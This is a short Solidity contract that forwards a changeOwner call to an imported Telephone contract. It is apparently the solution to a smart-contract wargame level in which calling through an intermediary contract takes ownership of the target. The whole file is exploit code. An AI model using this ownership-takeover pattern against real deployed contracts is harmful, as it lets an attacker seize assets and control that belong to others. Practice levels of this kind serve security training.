// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Telephone } from './Telephone.sol';

contract callTelephone {
    Telephone telephone ;

    constructor(address _address) {
        telephone = Telephone(_address);
    }

    function call_changeOwner(address _address) public {
        telephone.changeOwner(_address);
    }
}